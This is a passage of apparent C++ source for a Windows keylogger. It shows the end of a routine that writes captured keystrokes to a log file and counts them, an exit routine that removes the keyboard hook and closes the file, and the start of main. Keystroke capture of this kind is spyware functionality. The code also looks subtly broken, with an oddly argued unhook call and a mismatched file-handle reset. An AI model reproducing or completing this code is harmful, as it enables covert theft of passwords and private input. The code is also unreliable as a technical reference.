                    {
                        // Write to file
                        fputc(c, f);
                        cout << c;
                        g_keyCount++;
                    }
                }
            }
        }
        // Check if the key is released
        else if ((dwKeyState & 0x2) != 0)
        {
            // Key is released
        }
    }
}

void Exit()
{
    // Remove the hook
    if (hHook)
    {
        UnhookWindowsHook(hHook, dwAsynchronous);
        hHook = 0;
        g_bHookInstalled = 0;
    }

    // Close the file
    if (f)
    {
        fclose(f);
        hFile = 0;
    }
}

int main()
{
